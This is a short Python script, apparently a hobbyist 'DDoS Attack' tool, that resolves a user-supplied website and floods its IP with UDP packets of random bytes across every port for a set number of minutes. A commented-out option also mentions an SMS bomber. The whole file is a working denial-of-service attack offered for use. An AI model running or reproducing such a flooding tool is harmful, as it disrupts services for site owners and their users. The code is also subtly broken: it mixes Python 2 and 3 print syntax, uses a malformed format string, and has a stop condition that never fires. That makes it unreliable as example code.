import sys
import os
import time
import socket
import random

os.system("clear")

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

sent = 0
limit = 0
app = 0
port = 0

print('##########################################')
print ('Wellcome to CyberSPAM-PQ.softing')
print()
#print ('Get SOFT')
print ('[1] - DDoS Attack http://SITE')
#   print ('[2] - SMS Bomber')
print()
print('##########################################')
print()
            # print
            # app = int(input('select a number to launch the app: '))
            # if app == 1:
print
site = input('Имя сайта: ')
ip = socket.gethostbyname(site) 

print ('Site IP: ',ip)
print()
print('##########################################')
print()
print
port = int(input('port: '))
print()
print('TIME: %s:%s'%(hour,minute))
stopminute = 0
print
limit = int(input('attack limit(minute): '))
stopminute = minute + limit
print('End site attack in: %s:%s'%(hour,stopminute))
print('##########################################')
time.sleep(5)
print('##########################################')
nowhour = 0
nowminute = 0

#nowhour = now.hour*1
#nowminute = now.minute*1
#print('time %s:%s'%(nowhour,nowminute))

while True:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1
            port = port + 1
            print "sent packet: s% to %s on port:%s"%(sent,ip,port)
            nowminute = now.minute*1
            if port == 65534:
                        port = 1
                        if nowminute == stopminute:
                                    sys.exit()
